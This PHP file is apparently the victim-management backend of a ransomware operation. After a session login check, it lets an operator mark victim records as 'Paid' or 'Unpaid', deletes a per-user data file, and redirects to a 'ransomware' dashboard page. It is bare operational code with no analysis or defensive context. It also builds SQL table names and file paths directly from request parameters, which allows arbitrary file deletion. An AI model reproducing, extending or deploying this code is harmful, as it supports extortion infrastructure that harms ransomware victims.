<?php 
if(isset($_SESSION['LOGIN'])){
	if(isset($_GET['page']) && (!empty($_GET['id'])) && (!empty($_GET['act']))){
		if($_GET['act'] == "1") {
			$db->go("SELECT * FROM {$db->q($_GET['page'])} WHERE id = '{$db->q($_GET['id']/1909)}' AND status < 2 LIMIT 1");
			if($db->numRows()>0){
				$change = $db->go("UPDATE {$db->q($_GET['page'])} SET status = 1 WHERE id = '{$db->q($_GET['id']/1909)}'");
				if($change){
					@unlink("content/data/".$_GET['user'].".txt");
					$notice->addSuccess("Change to Paid Successfully!");
					header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
				}
			} else {
				$notice->addError("Change to Paid failed!");
				header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
			}
		} elseif($_GET['act'] == "2") {
			$db->go("SELECT * FROM {$db->q($_GET['page'])} WHERE id = '{$db->q($_GET['id']/1909)}' AND status < 2 LIMIT 1");
			if($db->numRows()>0){
				$change = $db->go("UPDATE {$db->q($_GET['page'])} SET status = 0 WHERE id = '{$db->q($_GET['id']/1909)}'");
				if($change){
					@unlink("content/data/".$_GET['user'].".txt");
					$notice->addSuccess("Change to Unpaid Successfully!");
					header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
				}
			} else {
				$notice->addError("Change to Unpaid failed!");
				header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
			}
		}
	}
} else {
	header("location: ".$GLOBALS['_CONF']['HTTP']);
} 
?>